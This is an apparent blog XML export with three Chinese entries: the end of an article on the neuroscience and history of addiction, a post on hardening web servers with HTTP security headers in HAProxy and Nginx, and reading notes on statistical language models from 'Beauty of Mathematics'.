中枢神经抑制剂。正如其它直接作用于中枢神经的药物一样（例如镇定剂），长期大量摄入酒精会影响中枢神经系统，引起耐药性。首先，醉酒之后血液中的酒精浓度降低，人会感到疲倦和沮丧，脑部的化学变化也会令人的长期情绪变得更低落。其次，饮酒产生的“正面”效应会递减，如果再次大量摄入之后无法感受到预期的效果，就必须加大剂量，“快乐”的欲念强迫饮酒者不顾一切地去寻求酒精，以满足自己的欲望。当某个人有长期摄取酒精饮料的习惯，会形成耐受性与心理依赖。一旦戒断就会带来难以忍受的痛苦，出现 酒精戒断症候群（Alcohol withdrawal syndrome） ：突然减少或中断酒精的摄取，会造成原本被抑制的神经系统过度活化，心理与生理上会因此产生各种不舒服症状。包括但不限于：肠胃不适、恶心和呕吐、全身疲倦、易累、心跳过速、流汗多、血压增高、体温上升、焦虑与烦躁不安、眼皮、嘴唇与双手发抖等戒断症状。严重时可能出现全身性痉挛、意识障碍，以及妄想、幻觉及谵妄等精神病症状。 2.8 尼古丁（Nicotine）尼古丁（Nicotine，又名烟碱）是香烟内的主要有效成分，是一种强效拟副交感神经生物碱。 尼古丁的健康风险。尼古丁进入体内，会经由血液传送，并可通过血脑屏障，吸入后平均只需7秒即可到达脑部，肝是主要代谢尼古丁的器官。吸烟会减低男士的性表现甚至不举；损害血液循环系统，令阴茎血管闭塞，导致阳痿；减低荷尔蒙分泌使生殖器官的反应迟缓；减少精子数目（比非吸烟者平均少二十个百分比），破坏精子正常发育及活动能力（精子畸形的机会会较常人高出一倍），增加伴侣流产和胎儿畸形的机会；两成的儿童患癌病个案与父亲吸烟有关；吸烟者的子女患支气管病的机会高出一至五成；加速患上中风机会。此外，尼古丁能减少食欲，三分之一烟民戒烟后体重都会增加。 尼古丁的成瘾机制：香烟（Cigarette）对身体造成的生理伤害和依赖性，和酒相当，比大麻和摇头丸严重，不如可卡因、海洛因严重。尼古丁可促使脑中奖励中心的神经元分泌的更多的多巴胺，产生幸福感和放松感，进而吸食成瘾。尼古丁会刺激交感神经，借由刺激内脏神经影响副肾髓质，释放肾上腺素。尼古丁与肾上腺髓质的烟碱接受器结合后，会增加血液中肾上腺素的含量，使心脏收缩力上升、兴奋性增高。此外，大部分香烟成分之中并不单只有烟草。生产商通常在香烟内加入大量不同的添加剂，目的是控制烟丝的成分和质量，防腐，以及改变燃点时烟雾对吸食者所能产生的感觉。部分低价香烟会直接加入丁香，目的是令吸烟者的口及肺部出现少量痳痹，从而产生轻微的快感。有些制造商还推出了薄荷烟等产品，其目的则是降低吸烟及二手烟的呛辣感、借此增加吸烟率。 2.9 药物成瘾总结综合上述成瘾药物的比较可以发现，成瘾刺激有二个特性，一个是其正向增强（接触后会再次进行类似行为的可能性增加），另一个是内在奖励（使用者主观上认为此物质或是行为有趣、会想要再去进行）。成瘾与伤害程度取决于药物的使用时间和剂量，同时并不是所有药物都具备高度健康风险，还需要两个条件：第一，该药物能够突破血脑屏障（blood–brain barrier (BBB),脑血管障壁)，指在血管和脑之间有一种选择性地阻止某些物质由血进入脑的“屏障”。该机制几乎不让所有的物质通过，除了氧气、二氧化碳和血糖，大部分的药和蛋白质由于分子结构过大，一般无法通过。该机制除了使脑部不会受到病菌的感染，还可以避免脑受到化学传导物质的影响。由于人体很多功能都由脑来控制，如果让化学传导物质在脑里自由流动，可能会造成反馈现象。第二，该药物能够带来快感（一段时间内），包括抑制类（止痛、麻醉）、兴奋类（抗抑郁、精力充沛）、幻觉等。如果为了获得快感，反复重演强化 “使用-快感-再次使用” 的奖赏路径（reward pathways），就很容易刺激活化大脑的奖赏机制，造成不可逆的生理变化。 构建奖赏路径的神经递质 类别 名称 分泌腺 说明 儿茶酚胺catecholamine 多巴（L-DOPA） —– —– 儿茶酚胺catecholamine 多巴胺 下丘脑 产生愉悦感 儿茶酚胺catecholamine 去甲肾上腺素 肾上腺髓质 升高血压，引起激动 儿茶酚胺catecholamine 肾上腺素 肾上腺髓质 提高兴奋性，伴随激动和焦虑 单胺型 5-羟色胺 中枢神经元及消化道 幸福和快乐感觉 —– 催产素 垂体后叶 爱情激素 —– 催乳素 垂体前叶 引发平静和放松感觉 —– POMC（内啡肽） 垂体前叶 效果类似吗啡 需要特别关注的是儿茶酚胺（catecholamine）：多巴、多巴胺、去甲肾上腺素、肾上腺素等物质的总称。哺乳动物交感神经元释放去甲肾上腺素，肾上腺髓质细胞既能释放肾上腺素，也释放去甲肾上腺素。 儿茶酚胺合成代谢路径：酪氨酸 → L-多巴 → 多巴胺 → 去甲肾上腺素 → 肾上腺素。 多巴胺（dopamine）：尼古丁会作用于脑部，使吸食者产生愉悦感并自然成瘾，因为它是一种将多巴胺量提高的化学物质。研究发现多巴胺是参与脑内活动的关键神经传递物，参与构建奖赏路径。 肾上腺素（Epinephrine）：临床用于强心药。自然状态中肾上腺素释放的主要生理触发因素集中在压力，如物理威胁，兴奋，噪音，亮灯和高温环境。促进增加心率、提高呼吸频率、刺激肝糖原分解、触发脂解和肌肉收缩，兴奋性提高，但是伴随激动和焦虑，详见 战斗或逃跑反应（Fight-or-flight response）。 去甲肾上腺素（Norepinephrine）：临床用于升压药。生理作用与肾上腺素相反，减慢心率、全身血管广泛收缩、显著升高血压，能引起激动但不焦虑。 5-羟色胺（Serotonin，血清素）：抑制性神经递质，产生幸福和快乐感觉。 组胺：中枢神经系统中参与睡眠、荷尔蒙的分泌、体温调节，食欲与记忆形成等功能，周边系统部分可引起痒、打喷嚏、流鼻水等现象 催产素（Oxytocin）是一种哺乳动物激素。临床药物常用来促使子宫收缩，用在引产、加速分娩、及停止产后出血。催产素有助于减轻压力及缓解疼痛。 催乳素（Prolactin，简称PRL）是一种由垂体前叶分泌的蛋白质激素。主要作用为促进乳腺发育生长，刺激并维持泌乳。催乳素能引发平静和放松感觉。 内啡肽（endorphin），亦称安多酚或脑内啡、脑内吗啡。顾名思义，是一种可于动物体内自行生成的类吗啡生物化学合成物。 三、人类生活中的瘾品3.1 饮食 人类对辣椒的喜好就和喜欢过山车或者喜欢洗烫水澡一样，是一种对极端刺激的特殊癖好。宾夕法尼亚大学心理学家保罗•罗岑（Paul Rozin） 除了一部分人类之外，地球上没有任何一种哺乳动物喜欢吃辣椒。一个重要因素可能是红辣椒之类的香辛料含有辣椒素，辣椒素能刺激脑内啡分泌，辣椒越辣分泌量越高，进而导致食辣之后改变人体对疼痛的感觉，产生一种类似与吸食鸦片后的欣快感。事实上，辣椒素确实被用来作为治疗慢性痛症的药物。中国许多地区（例如：湖南、海南，台湾）均有嚼食槟榔（Areca catechu）的风俗，其萃取物已证实有抗忧郁（抗抑郁）效果。槟榔吃后会面红耳赤，如醉酒一般，苏东坡写过“两颊红潮增妩媚，谁知侬是醉槟榔”。槟榔碱虽然曾被用来治疗寄生虫，但具有高度致癌性（第一类致癌物）。虽然医学上吃槟榔会致癌已经毋庸置疑，但是显然并不足以让人们放弃这个喜好，例如台湾18岁以上居民嚼食槟榔的比例有上升趋势。 3.2 运动据说主流中产阶级的三大生活方式是：“跑步、抄经、喝果汁”。有跑步习惯的人多少都了解过的概念：“跑者的愉悦感”（runner’s high），就是是指当运动量超过某一阶段后，肌肉内的糖原用尽，体内便会分泌脑内啡，产生止痛、欣快感。长时间、连续性的、中量至重量级的运动，诸如跑步，游泳，滑雪，划船，运动舞或球类运动等都有类似效果。所以，某些人群会从事超过身体负荷的运动量，甚至不惜运动伤害也要追去这种快感，可以理解为一种“运动上瘾”。 在职业健美人群中，存在一类瘾品 —— 同化类固醇（蛋白同化甾类，Anabolic steroid）。与大多数毒品追求的快感刺激不同，同化类固醇是一种能够促进细胞的生长与分化的激素。同化类固醇能能促进氨基酸中蛋白质生物合成，促进肌肉变大变壮，促进骨骼的生长。睾酮是最为常见的天然来源的蛋白蛋白同化甾类，也是天然的雄性激素。健康风险：大量或长期的使用，将使身体无法自行合成，终身需依赖外源补充。另外，促进雄性化的荷尔蒙在使用的过程中往往出现干扰的雌性化反应，导致高血压，性功能减退以及睾丸萎缩，肝功能及内分泌系统严重受损。 3.3 性有研究显示草原田鼠在交配时会分泌催产素，而催产素则会刺激分泌多巴胺。催产素对于多种人类行为发挥重要影响。抑制与行为控制／恐惧焦虑相关的大脑区域，引发平静和放松感觉，是性高潮出现的重要因素。其它包括社会认同、夫妻或情侣间的成对结合、焦虑和产妇的行为等都与之有关，因而被称为“爱情激素”。无法分泌催产素，与无法感到同情，反社会，精神病，自恋及一般的操控个性有相关性。《科学》（Science）上的一项研究还指出，人类和狗狗的相互凝视形成了催产素分泌的正反馈，正是这一反馈让狗狗成了人类最好的朋友；而狼就没有这个机制。 3.4 艺术在人类社会中，奖赏分为两类：初级奖赏(如食物、性)和次级奖赏（美学奖赏），例如如艺术、音乐和诗歌等。聆听音乐能诱发快乐体验是大多数人听音乐的主要原因，听音乐时诱发的强烈愉悦情绪可以对神经递质产生了影响，包括血清素、内啡肽、和催乳素。血清素通常与预期结果的满足感相关，人们听到喜爱的音乐时，体内的血清素水平显著升高；音乐引起颤栗时，会使人体释放出内啡肽，产生类似于吗啡一样的止痛效果和欣快感；甚至聆听悲伤音乐时也能诱发的快乐体验，这种体验与催乳素的分泌有关（缓解痛苦、平静感）。催乳素的分泌还能通过短环路反馈进行自我调节，例如单曲循环症（喜欢重复循环播放着同一首歌）。 3.5 宗教宗教致幻剂（entheogen） 这一概念是1979年由一群人类植物学家和神话学家创造出来的，用以代替“hallucinogen”（迷幻剂）和“psychedelic”（致幻剂），可以指一切被用于宗教或者精神领域的致幻剂。 宗教致幻剂一般是那些可以导致人类产生幻觉的自然植物／矿物质，它们在各种仪式中被使用了上千年。服用者借助心理暗示和致幻剂对神经系统产生的影响，获得 与神同在、与神交流 的心理体验。例如，科特迪瓦人会使用迷幻蘑菇。中国的道士使用大麻通神，量服丹砂导致的汞中毒或砷中毒，也会产生通神的幻觉。非洲的 Bwiti 人使用一种夹竹桃科植物 Tabernanthe iboga 的根皮作为宗教致幻剂的原料。埃及也有使用蓝睡莲和裸盖菇的记录。中医草药中曼陀罗被用以缓解哮喘症状和作为手术或接骨中的止痛剂，在印度教中，曼陀罗花（Datura stramonium，英语：Thorn apple）和大麻常被用于宗教仪式中，由于其效力过强很容易严重中毒。曼陀罗的主要成分是东莨菪碱，具有麻醉作用，它使肌肉松驰，抑制汗腺分泌，因此古人将此花所制的麻醉药取名为“蒙汗药”。 如果健美也算一种宗教的话，同化类固醇也可以称之为 entheogen 。 四、乱世爱嗑药18世纪以后，中国人口增加迅猛，生存压力加大，加之经常战乱，人们的安全感下降，避世厌世的情绪增加，于是很多人采取消极的态度对待，吸食鸦片就是其中的一种主要方式。 罂粟米囊谣 (谭嗣同)罂无粟， 囊无米， 室如悬磬饥欲死。饥欲死， 且莫理， 米囊可疗饥，罂粟栽千里。非米非粟，苍生病矣！ 维多利亚时代，英国人沉迷于鸦片的美妙感觉。几乎每个英国人都在他们生命的某一段时期服用过鸦片，发烧感冒，头疼脑热，呕吐腹泻，失眠多梦全靠它，服食鸦片就像喝酒或抽烟一样是生活的一部分。英国沼泽区的民众滥用鸦片的情况最严重，农业劳动的单调与繁重，沼泽地气候容易引发的疟疾、热症、风湿、神经痛和肌肉痛，鸦片“上瘾”的副作用，被当作是解脱病痛的代价。下流社会的不少酒鬼用鸦片代替酒精；上流社会的贵族、学者用鸦片享乐、激发灵感（1821年德·昆西发表了著名作品《一个英国吸食鸦片者的自白》）；英国国王乔治三世晚年嗜食鸦片，导致严重的精神疾病，诱因可能包括白内障和风湿病的困扰、幼女阿米莉亚公主病故等，“每天都是悲痛与嚎哭的场面……令人沮丧得难以形容”。 喝威士忌酒在当时时尚的英国也是一个新生事物。比如我的父亲，除了在荒野打猎时或某个非常阴冷的地方，他从来不喝威士忌。他生活在“白兰地加苏打水”的年代，事实上，白兰地加苏打水在当时是很体面高雅的瘾品。（温斯顿·丘吉尔《丘吉尔传·我的青春》p138） 1884年，著名的心理学家弗洛伊德首先拿自己做实验，使用可卡因之后感觉好的不得了，继而推荐亲朋好友使用可卡因（他接受过医师训练），作为酒精与吗啡上瘾之替代药品。凭着可卡因带来的兴奋感，写出了一篇叫《古柯颂歌》的论文，此举造成他的好友深染毒瘾（为了治疗受伤后遗症的疼痛）。对于这段错误判断可卡因的黑历史，弗洛伊德后面的著作中虽然多次自我检讨，但抹除了很多细节。 战争：兴奋剂发展的强大动力 战争带来的伤痛和恐惧会对士兵们的精神带来无比沉重的打击，因此人类社会大规模地集体服用兴奋剂都发生在战争时期。古希腊、罗马和现代法国军队都有配发红酒的传统，德国人配发啤酒，美国刚开始选择配发朗姆，自从内战之后就变成了威士忌。第一次世界大战把可卡因带进了前线，德国、法国的飞行员以及加拿大的部队都曾经使用过可卡因。伦敦热卖的医药套装盒子中包含有可卡因和海洛因，对于女孩子们而言这些盒子相当抢手，因为其宣传句就是“给前线的朋友最有用的礼物”，这些盒子会被她们迫切地送给身处前线的男朋友、未婚夫或是丈夫。希特勒曾注射甲基苯丙胺，特别是在苏德战争时期，纳粹军方广泛下发予士兵以作兴奋剂之用。日本也曾给士兵服用冰毒以提高战斗力，或者提供必须超长时间工作的军需工厂工人使用，在日本本土、台湾、及日占区都遗留下许多成瘾患者。 注解 《精神疾病诊断与统计手册》（The Diagnostic and Statistical Manual of Mental Disorders，简称DSM）：由美国精神医学学会出版，是一本最常使用来诊断精神疾病的指导手册。 《柳叶刀》（The Lancet）：世界上最悠久及最受重视的同行评审性质之医学期刊之一。 拜耳股份公司（Bayer AG）：一家德国制药及化工跨国集团（康采恩），世界500强之一。最著名的产品是阿司匹林，其他包括海洛因、美沙酮、芥子毒气、环丙沙星、聚氨酯、毒鼠强、巴拉松及残杀威等。 Kratom 卡痛 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)医学常识| NIH 情绪健康检查单扩展阅读 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》|戴维·考特莱特 综合了心理、药物、经济、文化、生态等领域的研究，详细介绍所有能让人类成瘾的物品，以及瘾品背后的经济、文化和战争。瘾品在历史上的力量有多大？它们为何有合法与违禁之分？是什么力量将瘾品的流行推动为规模庞大、模式各异的商品贸易？作者从瘾品的功能用途到它们的发现，到全球贸易的流通和经济政策，全面介绍精神瘾品的文化，追踪出大众化瘾品进入全球贸易主流的来龙去脉，内容有趣，视野广博，令人眼界大开。毫无疑问，它是一本关于瘾品文化史的经典著作，也是一本横跨世界史与药物史的杰作。 参考文献 Drugs, Brains, and Behavior: The Science of Addiction Economist: Birds’ nests and parasites Some birds use discarded cigarettes to fumigate their nests NIDA scientists review impact of smoking among adolescents with ADHD 香港特别行政区政府保安局禁毒处 物质使用障碍：这些要点你知道吗？| 原创 2016-05-11 医脉通 医脉通精神科 家暴施虐者背后的心理动机 | 潘幸知 欧美内参 鸦片在中国泛滥成灾的历史真相 | 人民网 我国对卡芬太尼等四种芬太尼类物质进行列管 | 新华社，20170216 化学控制：激素如何影响你的身心 潜规则：类固醇的骗局 | 果壳网 狗眼看人亲，只因催产素 | 果壳网 拥抱还是家暴：催产素的阴暗面 | 果壳网 男性大脑也分泌催产素：“社交基因”可能通过它决定你究竟是外向还是内向 | 科研圈 音乐情绪及其神经基础 | 王璐，陈旭*，马建苓 小说中的经济学:粮食还是罂粟？ 肖朋友：垃圾游戏，毁我青春，废我钱财 吸食冰毒所致寄生虫妄想：治疗对策 | 经典病例]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:Web应用安全：攻击、防护与检测]]></title>
    <url>%2F2017%2F08%2F31%2FCyberSecurity-Headers%2F</url>
    <content type="text"><![CDATA[摘要 Web 应用服务器安全：攻击、防护与检测 Web 应用服务器安全：攻击、防护与检测摘要目前有许多的恶意攻击都是以网站及其用户作为目标，本文将简要介绍在 Web 服务器一侧的安全加固和测试方法。 攻击方式 防护方式 说明 点击劫持(clickjacking) X-Frame-Options Header —– 基于 SSL 的中间人攻击(SSL Man-in-the-middle) HTTP Strict Transport Security —– 跨站脚本(Cross-site scripting,XSS) X-XSS-Protection、Content-Security-Policy、X-Content-Type-Options —– 点击劫持（Clickjacking）点击劫持,clickjacking 是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段，又被称为界面伪装（UI redressing）。例如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是被诱骗进入一个购物网站。 针对点击劫持攻击，开放Web应用程序安全项目(Open Web Application Security Project ,OWASP)(非营利组织，其目的是协助个人、企业和机构来发现和使用可信赖软件) 提供了一份指引，《Defending_with_X-Frame-Options_Response_Headers》 。 X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在 frame 标签 或者 object 标签中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 (clickjacking) 的攻击。DENY:表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。SAMEORIGIN:表示该页面可以在相同域名页面的 frame 中展示。ALLOW-FROM uri:表示该页面可以在指定来源的 frame 中展示。配置如下: 123456//HAProxyhttp-response set-header X-Frame-Options:DENY//Nginxadd_header X-Frame-Options "DENY";//Javaresponse.addHeader("x-frame-options","DENY"); 跨站脚本 Cross-site scripting (XSS)跨站脚本通常指的是通过利用开发时留下的漏洞，注入恶意指令代码（JavaScript/Java/VBScript/ActiveX/Flash/HTML等）到网页，使用户加载并执行攻击者恶意制造的程序。攻击者可能得到更高的权限、私密网页、会话和cookie等各种内容。目前有两种不同的 HTTP 响应头可以用来防止 XSS 攻击，它们是： X-XSS-Protection Content-Security-Policy X-XSS-ProtectionHTTP X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。配置选项：0 禁止XSS过滤。1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。mode=block 启用XSS过滤, 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。report=reporting-URI 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。参考文章《The misunderstood X-XSS-Protection》: 1234//HAProxyhttp-response set-header X-XSS-Protection: 1;mode=block//Nginxadd_header X-Xss-Protection "1; mode=block" always;; 浏览器支持情况： Chrome Edge Firefox Internet Explorer Opera Safari (Yes) (Yes) No 8.0 (Yes) (Yes) Content-Security-Policy内容安全性政策(Content Security Policy,CSP)就是一种白名单制度，明确告诉客户端哪些外部资源（脚本／图片／音视频等）可以加载和执行。浏览器可以拒绝任何不来自预定义位置的任何内容，从而防止外部注入的脚本和其他此类恶意内容。设置 Content-Security-Policy Header： 1234//HAProxy:http-response set-header Content-Security-Policy:script-src https://www.google-analytics.com;https://q.quora.com//Nginxadd_header Content-Security-Policy-Report-Only "script-src https://www.google-analytics.com https://q.quora.com"; MIME-SniffingMIME-Sniffing（主要是Internet Explorer）使用的一种技术，它尝试猜测资源的 MIME 类型（也称为 Content-Type 内容类型）。这意味着浏览器可以忽略由 Web 服务器发送的 Content-Type Header，而不是尝试分析资源（例如将纯文本标记为HTML 标签），按照它认为的资源（HTML）渲染资源而不是服务器的定义（文本）。虽然这是一个非常有用的功能，能够纠正服务器发送的错误的 Content-Type，但是心怀不轨的人可以轻易滥用这一特性，这使得浏览器和用户可能被恶意攻击。例如，如通过精心制作一个图像文件，并在其中嵌入可以被浏览器所展示和执行的HTML和t代码。《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》： Consider, for instance, the case of a picture-sharing web service which hosts pictures uploaded by anonymous users. An attacker could upload a specially crafted JPEG file that contained script content, and then send a link to the file to unsuspecting victims. When the victims visited the server, the malicious file would be downloaded, the script would be detected, and it would run in the context of the picture-sharing site. This script could then steal the victim’s cookies, generate a phony page, etc. 1234//HAProxyhttp-response set-header X-Content-Type-Options: nosniff//Nginxadd_header X-Content-Type-Options "nosniff" always; SSL Strip Man-in-The-Middle Attack中间人攻击中攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络。强制用户使用HTTP严格传输安全（HTTP Strict Transport Security,HSTS）。 HSTS 是一套由 IETF 发布的互联网安全策略机制。Chrome 和 Firefox 浏览器有一个内置的 HSTS 的主机列表，网站可以选择使用 HSTS 策略强制浏览器使用 HTTPS 协议与网站进行通信，以减少会话劫持风险。 服务器设置下列选项可以强制所有客户端只能通过 HTTPS 连接：1234//HAProxyhttp-response set-header Strict-Transport-Security max-age=31536000;includeSubDomains;preload//Nginxadd_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload; always;' 暴露 URL （HTTPS &gt; HTTP Sites)Referrer 信息被广泛用于网络访问流量来源分析，它是众多网站数据统计服务的基础，例如 Google Analytics 和 AWStats,基于Perl的开源日志分析工具。同样的这一特性也会很容易被恶意利用，造成用户敏感信息泄漏，例如将用户 SESSION ID 放在 URL 中，第三方拿到就可能看到别人登录后的页面内容。2014 年，W3C 发布了 Referrer Policy 的新草案，开发者开始有权控制自己网站的 Referrer Policy。但是仅有 Chrome／Firefox 浏览器较新的版本的能够提供支持。 Feature Chrome Firefox Edge、Internet Explorer、 Opera、Safari Basic Support 56.0 50.0 (No) same-origin (No)1 52.0 (No) strict-origin (No)1 52.0 (No) strict-origin-when-cross-origin (No)1 52.0 (No) Referrer-Policy选项列表： Referrer-Policy: no-referrer //整个 Referer 首部会被移除。访问来源信息不随着请求一起发送。 Referrer-Policy: no-referrer-when-downgrade //默认选项//引用页面的地址会被发送(HTTPS-&gt;HTTPS)，降级的情况不会被发送 (HTTPS-&gt;HTTP) Referrer-Policy: origin //在任何情况下，仅发送文件的源作为引用地址 Referrer-Policy: origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址，但是对于非同源请求仅发送文件的源 Referrer-Policy: same-origin //对于同源的请求会发送引用地址，但是对于非同源请求则不发送引用地址信息。 Referrer-Policy: strict-origin //在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS-&gt;HTTPS) Referrer-Policy: strict-origin-when-cross-origin //对于同源的请求，会发送完整的URL作为引用地址 Referrer-Policy: unsafe-url //无论是否同源请求，都发送完整的 URL（移除参数信息之后）作为引用地址。 我们必须确保用户从全 HTTPS 站点跳转到 HTTP 站点的时候，没有中间人可以嗅探出用户实际的 HTTPS URL，Referrer Policy 设置如下： 1234//HAProxyhttp-response set-header Referrer-Policy no-referrer-when-downgrade//Nginxadd_header Referrer-Policy: no-referrer-when-downgrade Source Destination Referrer （Policy :no-referrer-when-downgrade） https://test.com/blog1/ http://test.com/blog2/ NULL https://test.com/blog1/ https://test.com/blog2/ https://test.com/blog1/ http://test.com/blog1/ http://test.com/blog2/ http://test.com/blog1/ http://test.com/blog1/ http://example.com http://test.com/blog1/ http://test.com/blog1/ https://example.com http://test.com/blog1/ https://test.com/blog1/ http://example.com NULL 测试安全研究员 Scott Helme 贡献了一个非常棒的网站 [https://securityheaders.io/]，可以分析自己站点的Header(报文头)，并提出改进安全性的建议。示例如下（环境参数，Operating System: CentOS 7 ; haproxy 1.5.14 ; nginx 1.12.0）。 加固前的检测结果 加固后的检测结果 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 SSL Man-in-the-Middle Attacks|SANS Institute InfoSec Reading Room A new security header: Referrer Policy | Scott Helme 《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》 The WiFi Pineapple - Using Karma and SSLstrip to MiTM secure connections | Scott Helme Content Security Policy - An Introduction | Scott Helme Content Security Policy 入门教程 | 云栖社区 Referrer Policy 介绍 | Jerry Qu]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记|数学之美（Beauty Of Mathmetics）]]></title>
    <url>%2F2017%2F08%2F30%2FMathmetics-Beauty%2F</url>
    <content type="text"><![CDATA[摘要 作者：吴军 起源：Google中国的官方博客–谷歌黑板报连载的系列博客 主题：自然语言处理、科技史 数学的魅力就在于将复杂的问题复杂化 人类信息交流的发展贯穿了人类的进化和文明的全过程。而自然语言是人类交流信息的工具，语言和通信的联系是天然的。通信的本质就是一个解编码和传输的过程。（p49） 《数学之美》 Topic 自然语言识别与概率论：第 3、5、24 章 信息论：第 6 章 第一章 文字和语言 vs 数字和信息故事：罗赛塔石牌、犹太人抄圣经（校验）、口语和文言文（信道压缩） 通信的原理和信息传播的模型 （信源）编码和最短编码 解码的规则，语法 聚类 校验位 双语对照文本，语料库和机器翻译 多义性和利用上下文消除歧义性 第二章 自然语言处理——从规则到统计Tips: 宾夕法尼亚大学语言数据库（LDC） 图灵测试（阿兰-图灵(Alan Turing） ): 让人和机器交流，如果人无法判断自己交流的对象是否为机器时，就说明机器有智能了。 自然语言发展阶段 20世纪50-70年代：基于规则的方法，电脑模拟人脑理解语法、文法，收效甚微 20世纪70年代以后：基于数学模型和统计的方法。例如翻译，计算机不需要像人类一样理解两种语言。 人物 明斯基（达特茅斯会议的发起者之一）:著名人工智能专家,对美国科技决策部分产生了重大影响，自然科学基金会等对传统的自然语言处理研究资助大大减少。 弗里德里克-贾里尼克（Frederick Jelinek) | IBM:领导 IBM 华生实验室（T.J.Watson) 在统计语言学取得关键突破,语言识别70%-&gt;90% 长达15年的对峙时期两派人马各自召开自己的会议，持续争议。 基于统计方法的发展 上世纪70年代：基于统计的方法的核心模型是通信系统加隐含马尔可夫模型。输入和输出都是一维的符号序列，保持原有的次序。最早的语音识别、词性分析取得成果；句法分析中输入的是一维的句子，输出的是二维的分析树；机器翻译中，输出的句子次序会有很大变化，效果不佳。 1998年，彼得·布朗(Peter Brown) | IBM 等提出了基于统计的机器翻译方法效果很差，模型、数据不足。（文艺复兴技术公司） 基于有向图的统计模型解决复杂的句法分析。 20世纪90年代末期：通过统计得到的句法规则甚至比语言学家总结的更有说服力。 2005年，Google 基于统计方法的翻译系统全面超过基于规则方法的 SysTran 翻译系统 科学史的教训：等待老科学家退休 基于统计的方法代替传统的方法，需要等原有的一批语言学家退休。“老的科学家” 或者 “老科学的家” （钱钟书《围城》），后一种年纪不算老，但是已经落伍，大家必须耐心等待他们退休让出位子。毕竟，不是所有人都乐意改变自己的观点，无论对错。 …… 因此，我常想，我自己一定要在还不太糊涂和固执时就退休（p25） 第三章 统计语言模型计算机处理自然语言的基本问题：为自然语言这种上下文相关的特性建立数学模型，即 统计语言模型（Statistical Language Model） 贾里尼克：一个句子是否合理，就看看它的可能性大小如何。可能性用概率来衡量。 P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W1,W2) ··· P(Wn | W1,W2, … , Wn-1) S 表示某一个有意义的句子，由一连串特定顺序排列的词W1,W2, ··· , Wn 组成，n 是句子的长度。句子越长，条件概率 P(Wn | W1,W2, … , Wn-1) 的可能性越多，无法估算。 19 世纪到 20 世纪初，马尔可夫（Andrey Markov）提出假设，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下： P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1) 语料库（ Corpus ）: 大量机读样本相对频度根据 大数定理（ Law of Large Numbers ），只要统计量足够，相对频度就等于概率推导过程省略（P30） 延伸阅读：统计语言模型的工程诀窍 2.1 高阶语言模型很少有人能使用四元以上的模型，Google 的罗塞塔翻译系统和语言搜索引擎使用四元模型，该模型存储于 500 台 以上的 Google 服务器中。 马尔可夫假设的局限性：自然语言中上下文相关性跨度可能非常大，需采用其他一些 长程的依赖性（ Long Distance Dependency ） 来解决。 2.2 模型的训练、零概率问题和平滑方法 古德·图灵估计（ Good-Turing Estimate） 一种概率估计方法：1953年，古德（ I. J. Good）、图灵（ Alan Turing ）提出，在统计中相信可靠的统计数据，而对不可信的统计数据打折扣，同时将折扣出来的那一小部分概率给予未看见的事件（ Unseen Events ）。 